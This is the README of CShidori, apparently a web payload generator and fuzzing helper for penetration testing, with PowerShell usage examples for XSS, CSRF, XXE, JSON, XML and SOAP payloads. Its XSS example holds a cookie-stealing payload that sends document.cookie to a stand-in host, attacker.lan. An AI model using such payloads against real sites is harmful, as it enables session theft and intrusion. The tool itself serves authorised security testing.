# CShidori

Web payloads generator and fuzzer helper

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## References

OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

## Payloads generation

- Fuzzing list
- XSS
- JSON
- XML
- SOAP
- XSD
- GET
- CSRF
- XXE
- Mutation
- Encoding

## Exemples

### Combine a wordlist with Chidori to test a specific parameter:

```powershell
gc wordlist.txt |%{ .\CShidori.exe xss "$_" }
gc wordlist.txt |%{ .\CShidori.exe mut 5 "$_" }
```

### Generate get/post requests to tests

```powershell
.\CShidori.exe bc |%{ .\CShidori.exe get "?bar=foo&foo=bar" $_ }
.\CShidori.exe bc |%{ .\CShidori.exe json request.json $_ }
```

### Generate a xml request from an xsd file and test all parameters

```powershell
.\CShidori.exe xsd schema.xsd > request.xml
.\CShidori.exe bc |%{ .\CShidori.exe xml request.xml $_ }   
```

### Send the generated payloads with Ffuf through Burp

```powershell
.\CShidori.exe bc > list ; .\ffuf.exe -u https://target/FUZZ -w list:FUZZ -replay-proxy http://127.0.0.1:8080
```

## Usage

### XSS / Injections

```powershell
.\CShidori.exe xss 'document.location=\"https://attacker.lan?c=\"+document.cookie'
```

### JSON

```powershell
.\CShidori.exe json ..\testing\test.json "'"
```

### XML

```powershell
.\CShidori.exe xml ..\testing\exemple.xml "'"
```

### SOAP

```powershell
.\CShidori.exe soap ..\testing\exemple-helloservice.wsdl
```

### XSD

```powershell
.\CShidori.exe xsd ..\testing\exemple.xsd
```

### GET

```powershell
.\CShidori.exe get "?bar=foo&foo=bar" "'"
```

### CSRF

```powershell
.\CShidori.exe csrf post http://target.lan "name1=value1&name2=value2"
.\CShidori.exe csrf get http://target.lan "name1=value1&name2=value2"
```

### XXE

```powershell
.\CShidori.exe xxe file
.\CShidori.exe xxe call 
.\CShidori.exe xxe all
```

### Mutation

```powershell
.\CShidori.exe mut 5 test
```

### Encode

```powershell
.\CShidori.exe enc "<script>alert(1)</script>"
```

## Miscellaneous scripts

### CShidori-Spring.ps1

Security hotspots, endpoints, parameters and wsdl grabber from Spring projects

```powershell
. .\Spring-parser.ps1
Get-SpringArtefact -source .\project\repository -output .
```